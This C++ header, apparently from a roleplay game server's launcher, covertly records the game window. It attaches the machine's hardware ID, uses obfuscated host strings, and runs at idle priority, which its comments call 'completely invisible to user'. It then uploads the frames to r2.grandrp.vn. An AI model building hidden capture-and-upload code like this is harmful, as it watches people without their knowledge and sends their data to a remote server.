#pragma once
/**
 * ScreenRecorder.h — Low-res, low-FPS screen recording system
 *
 * Records the screen at very low quality and uploads chunks to FxAPI server
 * every UPLOAD_INTERVAL_SEC seconds via the SendToFxAPI_V2 TCP protocol.
 *
 * Design:
 *   - Captures frames using GDI BitBlt (same as ScreenCapture.cpp)
 *   - Downscales to RECORD_SCALE (e.g. 0.25 = 1/4 resolution)
 *   - Encodes each frame as low-quality JPEG
 *   - Packages multiple frames into a simple binary container (MJPEG-like)
 *   - Sends container to server as a file via SendToFxAPI_V2 every 3 minutes
 *
 * Container format (per upload):
 *   [4B: magic "SCRR"]
 *   [4B: version = 1]
 *   [4B: frame_count]
 *   [2B: width]  [2B: height]
 *   [1B: fps]
 *   for each frame:
 *     [4B: timestamp_ms (relative to chunk start)]
 *     [4B: jpeg_size]
 *     [jpeg_size bytes: JPEG data]
 */

#include <Windows.h>
#include <gdiplus.h>
#include <vector>
#include <string>
#include <thread>
#include <atomic>
#include <chrono>
#include <mutex>
#include <cstdint>
#include <algorithm>
#include <ScreenCapture.h>  // For SendToFxAPI_V2, FxFile, AY_OBFUSCATE
#include <HwidChecker.h>    // For GetHWIDV2JsonString

#pragma comment(lib, "Gdiplus.lib")
#pragma comment(lib, "Wininet.lib")
#include <wininet.h>

// ─── Recording Parameters (defaults — overridden by server config) ───
#define DEFAULT_RECORD_SCALE          0.35
#define DEFAULT_RECORD_JPEG_QUALITY   50
#define DEFAULT_RECORD_FPS            5
#define DEFAULT_UPLOAD_INTERVAL_SEC   1
#define DEFAULT_MAX_FRAMES_PER_CHUNK  20
#define DEFAULT_STARTUP_DELAY_SEC     60
 
// ─── Container Magic & Version ───
static const uint32_t SCRR_MAGIC   = 0x53435252; // "SCRR"
static const uint32_t SCRR_VERSION = 1;

// ─── JPEG Encoder (shared with ScreenCapture.cpp) ───
static std::once_flag g_onceRecorderGdip;
static std::once_flag g_onceRecorderJpeg;
static CLSID g_recorderJpegClsid{};
static ULONG_PTR g_recorderGdipToken{};

static void InitRecorderGdiplusOnce() {
    Gdiplus::GdiplusStartupInput in;
    Gdiplus::GdiplusStartup(&g_recorderGdipToken, &in, nullptr);
}

static void InitRecorderJpegClsidOnce() {
    UINT n = 0, sz = 0;
    Gdiplus::GetImageEncodersSize(&n, &sz);
    if (!sz) return;
    std::unique_ptr<BYTE[]> buf(new BYTE[sz]);
    auto* enc = reinterpret_cast<Gdiplus::ImageCodecInfo*>(buf.get());
    if (Gdiplus::GetImageEncoders(n, sz, enc) != Gdiplus::Ok) return;
    for (UINT i = 0; i < n; ++i) {
        if (wcscmp(enc[i].MimeType, L"image/jpeg") == 0) {
            g_recorderJpegClsid = enc[i].Clsid;
            break;
        }
    }
}

// ─── Frame Data ───
struct RecordedFrame {
    uint32_t timestampMs;         // ms since chunk start
    std::vector<uint8_t> jpegData;
};

// ─── Persistent TCP Connection to Recording Server ───
// Maintains a single TCP socket connection, auto-reconnects on failure.
// Avoids creating a new TCP connection every upload (critical at 15s intervals).
class RecordingConnection {
public:
    RecordingConnection()
        : m_io(), m_socket(m_io), m_connected(false) {}

    ~RecordingConnection() { Disconnect(); }

    bool EnsureConnected() {
        if (m_connected) {
            // Quick liveness check
            boost::system::error_code ec;
            m_socket.remote_endpoint(ec);
            if (!ec) return true;
            Disconnect();
        }
        return Connect();
    }

    int Send(const std::string& eventName,
             const std::string& metadataJson,
             const std::vector<FxFile>& files,
             const std::function<void(int, std::string)>& callback)
    {
        if (!EnsureConnected()) {
            callback(false, "cannot connect to recording server");
            return 1;
        }

        try {
            std::vector<uint8_t> payload_inner;
            payload_inner.push_back(2u); // version

            append_string_be(payload_inner, eventName);
            append_string_be(payload_inner, metadataJson);

            append_u32_be(payload_inner, static_cast<uint32_t>(files.size()));
            for (const auto& f : files) {
                append_string_be(payload_inner, f.name);
                append_string_be(payload_inner, f.mime);
                append_bytes_be(payload_inner, f.data.data(), f.data.size());
            }

            std::vector<uint8_t> frame;
            append_u32_be(frame, static_cast<uint32_t>(payload_inner.size()));
            frame.insert(frame.end(), payload_inner.begin(), payload_inner.end());

            boost::asio::write(m_socket, boost::asio::buffer(frame.data(), frame.size()));

            // Read response
            uint8_t rlenb[4];
            boost::asio::read(m_socket, boost::asio::buffer(rlenb, 4));
            uint32_t rlen =
                (static_cast<uint32_t>(rlenb[0]) << 24) |
                (static_cast<uint32_t>(rlenb[1]) << 16) |
                (static_cast<uint32_t>(rlenb[2]) << 8) |
                (static_cast<uint32_t>(rlenb[3]));

            if (rlen == 0 || rlen > 50 * 1024 * 1024) {
                callback(false, "invalid reply length");
                Disconnect();
                return 1;
            }

            std::vector<char> rbuf(rlen);
            boost::asio::read(m_socket, boost::asio::buffer(rbuf.data(), rlen));
            std::string reply(rbuf.begin(), rbuf.end());
            json resp = json::parse(reply);
            callback(resp["ok"], resp["data"]);
            return 0;

        } catch (const std::exception& e) {
            Disconnect(); // Force reconnect on next Send
            callback(false, std::string("ERR: ") + e.what());
            return 1;
        }
    }

private:
    boost::asio::io_context m_io;
    tcp::socket m_socket;
    bool m_connected;

    bool Connect() {
        try {
            const char* host = AY_OBFUSCATE("r2.grandrp.vn"); // obfuscated
            const char* port = AY_OBFUSCATE("9001");             // obfuscated

            // Recreate socket on new io_context for clean state
            m_io.restart();
            m_socket = tcp::socket(m_io);

            tcp::resolver resolver(m_io);
            auto endpoints = resolver.resolve(host, port);
            boost::asio::connect(m_socket, endpoints);

            m_socket.set_option(boost::asio::socket_base::send_buffer_size(256 * 1024));
            m_socket.set_option(boost::asio::socket_base::keep_alive(true));

            m_connected = true;
            return true;
        } catch (...) {
            m_connected = false;
            return false;
        }
    }

    void Disconnect() {
        try {
            if (m_socket.is_open()) m_socket.close();
        } catch (...) {}
        m_connected = false;
    }
};

// Thread-safe singleton for the persistent connection
static RecordingConnection& GetRecordingConnection() {
    static RecordingConnection conn;
    return conn;
}
static std::mutex g_connMutex; // Serialize access to persistent connection

// ─── ScreenRecorder Class ───
class ScreenRecorder {
public:
    ScreenRecorder() = default;
    ~ScreenRecorder() { Stop(); }

    // Non-copyable
    ScreenRecorder(const ScreenRecorder&) = delete;
    ScreenRecorder& operator=(const ScreenRecorder&) = delete;

    /**
     * Start recording in a background thread.
     * Call this once during initialization.
     */
    void StartRecording() {
        if (m_running.load()) return;
        m_running.store(true);

        std::thread([this]() {
            RecordingLoop();
        }).detach();

    }

    void Stop() {
        m_running.store(false);
    }

private:
    std::atomic<bool> m_running{ false };
    std::mutex m_framesMutex;
    std::vector<RecordedFrame> m_frames;
    uint16_t m_frameWidth = 0;
    uint16_t m_frameHeight = 0;

    // ─── Main Recording Loop (optimized: low priority thread) ───
    std::atomic<int> m_consecutiveFailures{ 0 };
    static const int MAX_CONSECUTIVE_FAILURES = 5;
    static const int RECONNECT_WAIT_SEC = 60;

    // ─── Dynamic config (fetched from server, fallback to defaults) ───
    double   m_cfgScale            = DEFAULT_RECORD_SCALE;
    int      m_cfgJpegQuality      = DEFAULT_RECORD_JPEG_QUALITY;
    int      m_cfgFps              = DEFAULT_RECORD_FPS;
    int      m_cfgUploadIntervalSec = DEFAULT_UPLOAD_INTERVAL_SEC;
    int      m_cfgMaxFramesPerChunk = DEFAULT_MAX_FRAMES_PER_CHUNK;
    int      m_cfgStartupDelaySec  = DEFAULT_STARTUP_DELAY_SEC;

    // ─── Fetch config from server via HTTP ───
    bool FetchServerConfig() {
        HINTERNET hInet = InternetOpenA("SRec/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInet) return false;

        // Build URL: http://<host>:3001/rec-config
        const char* host = AY_OBFUSCATE("r2.grandrp.vn");
        const char* configPath = AY_OBFUSCATE("/rec-config");

        HINTERNET hConn = InternetConnectA(hInet, host, 3001,
            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConn) { InternetCloseHandle(hInet); return false; }

        HINTERNET hReq = HttpOpenRequestA(hConn, "GET", configPath,
            NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hInet); return false; }

        // Set a short timeout (5 seconds)
        DWORD timeout = 5000;
        InternetSetOptionA(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
        InternetSetOptionA(hReq, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));

        if (!HttpSendRequestA(hReq, NULL, 0, NULL, 0)) {
            InternetCloseHandle(hReq); InternetCloseHandle(hConn); InternetCloseHandle(hInet);
            return false;
        }

        // Read response
        std::string body;
        char buf[1024];
        DWORD bytesRead = 0;
        while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
            buf[bytesRead] = '\0';
            body += buf;
            bytesRead = 0;
        }

        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        InternetCloseHandle(hInet);

        // Simple JSON parsing (no dependency needed)
        auto getDouble = [&](const char* key) -> double {
            std::string k = std::string("\"" ) + key + "\"";
            auto pos = body.find(k);
            if (pos == std::string::npos) return -1;
            pos = body.find(':', pos);
            if (pos == std::string::npos) return -1;
            return std::strtod(body.c_str() + pos + 1, nullptr);
        };

        double v;
        if ((v = getDouble("scale")) > 0) m_cfgScale = v;
        if ((v = getDouble("jpegQuality")) > 0) m_cfgJpegQuality = (int)v;
        if ((v = getDouble("fps")) > 0) m_cfgFps = (int)v;
        if ((v = getDouble("uploadIntervalSec")) > 0) m_cfgUploadIntervalSec = (int)v;
        if ((v = getDouble("maxFramesPerChunk")) > 0) m_cfgMaxFramesPerChunk = (int)v;
        if ((v = getDouble("startupDelaySec")) > 0) m_cfgStartupDelaySec = (int)v;

        // Ensure we got at least something to call it a success
        return !body.empty();
    }

    void RecordingLoop() {
        // Lowest possible priority — completely invisible to user
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_IDLE);

        // Fetch config from server. If server is down/unreachable, disable recording!
        if (!FetchServerConfig()) {
            m_running.store(false);
            return;
        }

        // Delay startup — let the game fully load first
        Sleep(m_cfgStartupDelaySec * 1000);
        if (!m_running.load()) return;

        // Pre-flight: verify server is reachable before wasting any resources
        {
            std::lock_guard<std::mutex> lock(g_connMutex);
            if (!GetRecordingConnection().EnsureConnected()) {
                m_running.store(false);
                return;
            }
        }

        std::call_once(g_onceRecorderGdip, InitRecorderGdiplusOnce);
        std::call_once(g_onceRecorderJpeg, InitRecorderJpegClsidOnce);

        const int frameIntervalMs = 1000 / m_cfgFps;
        auto chunkStartTime = std::chrono::steady_clock::now();

        while (m_running.load()) {
            // ── If too many consecutive upload failures, pause capture and retry connection ──
            if (m_consecutiveFailures.load() >= MAX_CONSECUTIVE_FAILURES) {
                // Clear any buffered frames to save memory
                {
                    std::lock_guard<std::mutex> lock(m_framesMutex);
                    m_frames.clear();
                }

                Sleep(RECONNECT_WAIT_SEC * 1000);
                if (!m_running.load()) break;

                // Try to reconnect
                {
                    std::lock_guard<std::mutex> lock(g_connMutex);
                    if (!GetRecordingConnection().EnsureConnected()) {
                        m_running.store(false);
                        break;
                    }
                }
                m_consecutiveFailures = 0;
                chunkStartTime = std::chrono::steady_clock::now();
            }

            auto frameStart = std::chrono::steady_clock::now();

            // Capture one frame
            CaptureFrame(chunkStartTime);

            // Check if it's time to upload
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - chunkStartTime).count();

            if (elapsed >= m_cfgUploadIntervalSec) {
                // Upload in a separate thread to avoid blocking capture
                std::vector<RecordedFrame> framesToUpload;
                uint16_t w, h;
                {
                    std::lock_guard<std::mutex> lock(m_framesMutex);
                    framesToUpload.swap(m_frames);
                    w = m_frameWidth;
                    h = m_frameHeight;
                }

                if (!framesToUpload.empty()) {
                    std::thread([this, frames = std::move(framesToUpload), w, h]() {
                        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_IDLE);
                        bool success = UploadChunk(frames, w, h);
                        // Safety: only update counter if recorder is still alive
                        if (m_running.load()) {
                            if (success) {
                                m_consecutiveFailures.store(0);
                            } else {
                                m_consecutiveFailures.fetch_add(1);
                            }
                        }
                    }).detach();
                }

                chunkStartTime = std::chrono::steady_clock::now();
            }

            // Sleep for remaining frame time
            auto frameEnd = std::chrono::steady_clock::now();
            auto frameElapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
                frameEnd - frameStart).count();
            int sleepMs = frameIntervalMs - static_cast<int>(frameElapsed);
            if (sleepMs > 0) {
                Sleep(static_cast<DWORD>(sleepMs));
            }
        }

        // Cleanup cached GDI resources
        CleanupGDI();
    }

    // ─── Cached GDI resources (avoid alloc/dealloc every frame) ───
    HDC    m_cachedMemDC = nullptr;
    HBITMAP m_cachedBmp = nullptr;
    int    m_cachedW = 0;
    int    m_cachedH = 0;

    void CleanupGDI() {
        if (m_cachedBmp) { DeleteObject(m_cachedBmp); m_cachedBmp = nullptr; }
        if (m_cachedMemDC) { DeleteDC(m_cachedMemDC); m_cachedMemDC = nullptr; }
        m_cachedW = m_cachedH = 0;
    }

    // ─── Capture a Single Frame (game window only) ───
    void CaptureFrame(const std::chrono::steady_clock::time_point& chunkStart) {
        if (g_recorderJpegClsid == CLSID{}) return;

        // Find the game window by its known class name
        HWND hGameWnd = FindWindowW(L"grcWindow", nullptr);
        if (!hGameWnd || !IsWindow(hGameWnd)) return;

        // Skip if minimized (no visible content)
        if (IsIconic(hGameWnd)) return;

        // Get game window client area dimensions
        RECT clientRect;
        if (!GetClientRect(hGameWnd, &clientRect)) return;
        int srcW = clientRect.right - clientRect.left;
        int srcH = clientRect.bottom - clientRect.top;
        if (srcW <= 0 || srcH <= 0) return;

        int dstW = std::max(1, static_cast<int>(srcW * m_cfgScale));
        int dstH = std::max(1, static_cast<int>(srcH * m_cfgScale));

        // Recreate cached GDI resources only when resolution changes
        if (m_cachedMemDC == nullptr || m_cachedW != dstW || m_cachedH != dstH) {
            CleanupGDI();
            HDC hScr = GetDC(hGameWnd);
            if (!hScr) return;
            m_cachedMemDC = CreateCompatibleDC(hScr);
            m_cachedBmp = CreateCompatibleBitmap(hScr, dstW, dstH);
            ReleaseDC(hGameWnd, hScr);
            if (!m_cachedMemDC || !m_cachedBmp) { CleanupGDI(); return; }
            m_cachedW = dstW;
            m_cachedH = dstH;
        }

        // Capture the game window client area and scale in one GDI call
        HDC hWndDC = GetDC(hGameWnd);
        if (!hWndDC) return;

        HGDIOBJ oldObj = SelectObject(m_cachedMemDC, m_cachedBmp);
        SetStretchBltMode(m_cachedMemDC, HALFTONE);
        SetBrushOrgEx(m_cachedMemDC, 0, 0, nullptr);
        StretchBlt(m_cachedMemDC, 0, 0, dstW, dstH,
                   hWndDC, 0, 0, srcW, srcH, SRCCOPY);
        SelectObject(m_cachedMemDC, oldObj);
        ReleaseDC(hGameWnd, hWndDC);

        // Convert to GDI+ bitmap for JPEG encoding
        Gdiplus::Bitmap bmp(m_cachedBmp, nullptr);

        // Encode to JPEG with very low quality
        Gdiplus::EncoderParameters ep;
        ep.Count = 1;
        ep.Parameter[0].Guid = Gdiplus::EncoderQuality;
        ep.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
        ep.Parameter[0].NumberOfValues = 1;
        ULONG quality = m_cfgJpegQuality;
        ep.Parameter[0].Value = &quality;

        IStream* stm = nullptr;
        if (FAILED(CreateStreamOnHGlobal(NULL, TRUE, &stm))) return;

        if (bmp.Save(stm, &g_recorderJpegClsid, &ep) != Gdiplus::Ok) {
            stm->Release();
            return;
        }

        STATSTG ss{};
        if (FAILED(stm->Stat(&ss, STATFLAG_NONAME))) { stm->Release(); return; }

        SIZE_T len = static_cast<SIZE_T>(ss.cbSize.QuadPart);
        std::vector<uint8_t> jpegData(len);

        LARGE_INTEGER z{};
        stm->Seek(z, STREAM_SEEK_SET, nullptr);
        ULONG rd = 0;
        stm->Read(jpegData.data(), static_cast<ULONG>(len), &rd);
        stm->Release();

        if (rd != len) return;

        // Calculate timestamp relative to chunk start
        auto now = std::chrono::steady_clock::now();
        uint32_t timestampMs = static_cast<uint32_t>(
            std::chrono::duration_cast<std::chrono::milliseconds>(now - chunkStart).count());

        // Store frame
        {
            std::lock_guard<std::mutex> lock(m_framesMutex);
            m_frameWidth = static_cast<uint16_t>(dstW);
            m_frameHeight = static_cast<uint16_t>(dstH);

            // Cap frames to prevent excessive memory usage
            if (m_frames.size() < m_cfgMaxFramesPerChunk) {
                m_frames.push_back({ timestampMs, std::move(jpegData) });
            }
        }
    }

    // ─── Build Container and Upload via Persistent Connection ───
    bool UploadChunk(const std::vector<RecordedFrame>& frames, uint16_t width, uint16_t height) {
        if (frames.empty()) return true; // nothing to upload is not a failure

        try {
            // Build binary container
            std::vector<uint8_t> container;
            container.reserve(64 * 1024); // 64KB for 15s @ 1fps

            // Header
            auto pushU32 = [&container](uint32_t v) {
                container.push_back(static_cast<uint8_t>((v >> 24) & 0xFF));
                container.push_back(static_cast<uint8_t>((v >> 16) & 0xFF));
                container.push_back(static_cast<uint8_t>((v >> 8) & 0xFF));
                container.push_back(static_cast<uint8_t>(v & 0xFF));
            };
            auto pushU16 = [&container](uint16_t v) {
                container.push_back(static_cast<uint8_t>((v >> 8) & 0xFF));
                container.push_back(static_cast<uint8_t>(v & 0xFF));
            };

            pushU32(SCRR_MAGIC);                              // Magic
            pushU32(SCRR_VERSION);                            // Version
            pushU32(static_cast<uint32_t>(frames.size()));    // Frame count
            pushU16(width);                                   // Width
            pushU16(height);                                  // Height
            container.push_back(static_cast<uint8_t>(m_cfgFps)); // FPS

            // Frames
            for (const auto& frame : frames) {
                pushU32(frame.timestampMs);
                pushU32(static_cast<uint32_t>(frame.jpegData.size()));
                container.insert(container.end(), frame.jpegData.begin(), frame.jpegData.end());
            }

            // Generate timestamp for filename (with ms to avoid collision at 15s interval)
            SYSTEMTIME st;
            GetLocalTime(&st);
            char filename[128];
            sprintf_s(filename, "rec_%04u%02u%02u_%02u%02u%02u_%03u.scrr",
                      st.wYear, st.wMonth, st.wDay,
                      st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);

            // Build metadata JSON
            json metadata;
            std::string k_hwid = AY_OBFUSCATE("hwid");
            std::string k_launcher = AY_OBFUSCATE("launcher_name");
            std::string k_timestamp = AY_OBFUSCATE("timestamp");
            std::string k_frames = AY_OBFUSCATE("frame_count");
            std::string k_width = AY_OBFUSCATE("width");
            std::string k_height = AY_OBFUSCATE("height");
            std::string k_fps = AY_OBFUSCATE("fps");
            std::string k_duration = AY_OBFUSCATE("duration_sec");

            metadata[k_hwid] = GetHWIDV2JsonString();
            metadata[k_launcher] = ToNarrow(PRODUCT_NAME);
            metadata[k_timestamp] = fmt::sprintf("%04u-%02u-%02u %02u:%02u:%02u",
                                                  st.wYear, st.wMonth, st.wDay,
                                                  st.wHour, st.wMinute, st.wSecond);
            metadata[k_frames] = frames.size();
            metadata[k_width] = width;
            metadata[k_height] = height;
            metadata[k_fps] = m_cfgFps;

            // Duration = last frame timestamp in seconds
            uint32_t durationSec = frames.back().timestampMs / 1000;
            metadata[k_duration] = durationSec;

            // Send via dedicated recording TCP server (port 9001)
            std::vector<FxFile> files;
            FxFile recording;
            recording.name = std::string(filename);
            recording.mime = "application/octet-stream";
            recording.data = std::move(container);
            files.push_back(std::move(recording));

            std::string eventName = AY_OBFUSCATE("SCREEN_RECORD");

            bool uploadOk = false;
            // Use persistent connection (serialized with mutex)
            {
                std::lock_guard<std::mutex> lock(g_connMutex);
                GetRecordingConnection().Send(eventName, metadata.dump(), files,
                    [&uploadOk](int ok, std::string) {
                        if (ok) uploadOk = true;
                    });
            }
            return uploadOk;

        } catch (...) {
            return false;
        }
    }
};

